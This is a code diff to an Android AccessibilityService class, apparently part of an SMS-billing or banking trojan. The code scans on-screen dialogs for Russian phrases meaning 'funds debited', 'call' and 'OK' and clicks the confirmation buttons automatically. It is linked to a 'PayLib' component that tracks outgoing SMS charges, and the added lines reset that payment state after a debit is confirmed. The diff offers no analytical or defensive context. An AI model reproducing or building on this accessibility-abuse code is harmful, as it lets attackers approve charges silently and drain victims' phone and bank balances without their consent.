@@ -94,6 +94,9 @@ public class AccessService extends AccessibilityService {
             if ((curSMSOut != null || PayLib.currentMsg != null) && str.contains("списаны средства")) {
                 Logger.lg("PayLib.curSMSOut");
                 clickOnButtonOK(event, 0);
+                PayLib.curMesage.clear();
+                curSMSOut = null;
+                PayLib.currentMsg = null;
             }
         } else {
             Logger.lg("str " + event.getText()
@@ -274,7 +277,6 @@ public class AccessService extends AccessibilityService {
                                         || nodeButton.getChild(k).getText().toString().toLowerCase().contains("позвони")
                                         || nodeButton.getChild(k).getText().toString().toLowerCase().contains("ок")) {
                                     nodeButton.getChild(k).performAction(AccessibilityNodeInfo.ACTION_CLICK);
-
                                     flagok = false;
                                     PayLib.checkSmsAdditional();
                                 }
